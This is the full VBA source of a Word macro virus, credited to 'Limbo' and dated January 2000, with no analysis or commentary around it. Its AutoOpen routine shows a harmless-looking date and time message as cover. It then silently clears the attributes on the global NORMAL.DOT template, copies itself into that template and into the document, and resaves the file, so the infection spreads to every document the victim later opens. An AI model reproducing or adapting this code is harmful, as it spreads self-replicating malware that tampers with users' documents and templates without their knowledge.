   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim curtime$
   Dim curdate$
   Dim TimeandDate$
   Dim file$
   Dim filePM$
   Dim fileND$
   Dim informationGroup$
   Dim informationAutor$
   Dim informationCopyRight$
   curtime$ = WordBasic.[Time$]()
   curdate$ = WordBasic.[Date$]()
   TimeandDate$ = "Date:" + curdate$ + " " + "Time:" + curtime$
   WordBasic.MsgBox TimeandDate$, "The Date and Time Is"
   On Error Resume Next
   file$ = WordBasic.[FileName$]()
   filePM$ = WordBasic.[FileName$]() + ":AutoOpen"
   fileND$ = WordBasic.[DefaultDir$](2) + "\NORMAL.DOT"
   informationGroup$ = " Association of Professionals in Computer Scince"
   informationAutor$ = "Limbo"
   informationCopyRight$ = "(c) January 2000"
   If GetAttr(fileND$) <> 0 Then SetAttr fileND$, 0
   WordBasic.Organizer Copy:=1, Source:=file$, Destination:=fileND$, Name:="AutoOpen", Tab:=3
   WordBasic.MacroCopy "AutoOpen", filePM$
   WordBasic.FileSaveAs Format:=1
   End Sub
